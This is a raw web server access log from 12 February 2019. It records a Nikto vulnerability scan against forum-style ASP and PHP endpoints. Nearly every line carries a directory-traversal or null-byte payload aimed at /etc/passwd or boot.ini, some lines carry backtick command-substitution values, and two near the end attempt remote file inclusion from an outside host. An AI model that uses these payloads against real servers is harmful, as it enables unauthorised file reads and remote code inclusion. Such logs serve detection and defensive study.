172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=/../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=/../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum.asp?n=c:\\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum/mainfile.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002386)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum/member.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002387)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum/newreply.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002388)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum/newthread.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002389)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum/viewtopic.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002390)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002391)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002392)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=../../../../../../../../../etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002393)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=../../boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002394)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=/....../boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002395)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002396)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=/../../../../../../etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002397)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=/../../../etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002398)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002399)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=/etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002400)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=/etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002401)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=%60/etc/passwd%60 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002402)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=....//....//....//....//....//....//....//etc.passwd HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002403)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=../../../../../../../../../../etc/passwd HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002404)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002405)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=/....../boot.ini HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002406)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=/..../boot.ini HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002407)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=/../../../../../../../../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002408)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002409)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=/etc/passwd HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002410)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=/etc/passwd%00 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002411)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=1753&amp;nn=c:\\boot.ini HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002412)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1.asp?n=c:\\boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002413)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=%60/etc/passwd%60&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002414)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002415)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=../../../../../../../../../etc/passwd%00&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002416)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=/....../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002417)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=/.../.../.../.../.../.../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002418)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002419)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=/../../../../../../../../etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002420)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002421)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=/etc/passwd%00&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002422)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=/etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002423)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=%60/etc/passwd%60&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002424)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=....//....//....//....//....//....//....//etc.passwd&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002425)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=../../../../../../../../../etc/passwd%00&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002426)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=/....../boot.ini&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002427)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../../../../../../../../../../../../../boot.ini&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002428)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../etc/passwd&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002429)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002430)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd%00&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002431)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002432)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=%60/etc/passwd%60 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002433)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=....//....//....//....//....//....//....//etc.passwd HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002434)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002435)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/....../boot.ini HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002436)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/..../boot.ini HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002437)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.../.../.../.../.../.../boot.ini HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002438)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002439)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../etc/passwd HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002440)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002441)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002442)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd%00 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002443)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=c:\\boot.ini HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002444)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=1771&amp;nn=c:\\boot.ini&amp;page=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002445)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum1_professionnel.asp?n=c:\\boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002446)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=%60/etc/passwd%60|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=../../../../../../../../../etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=/....../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=/.../.../.../.../.../.../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=/../../../../../../../../etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=/etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=/etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=268 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002456)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_arc.asp?n=c:\\boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=/.../.../.../.../.../.../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=/../../../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=100 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002468)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /forum_professionnel.asp?n=c:\\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /functions.inc.php+ HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002470)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /get_od_toc.pl?Profile= HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002471)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /globals.php3 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002472)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /globals.pl HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002473)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /Gozila.cgi HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002474)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /helperfunction.php?includedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002475)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /homebet/homebet.dll?form=menu&amp;option=menu-signin HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002476)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /htmltonuke.php?filnavn=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002477)"
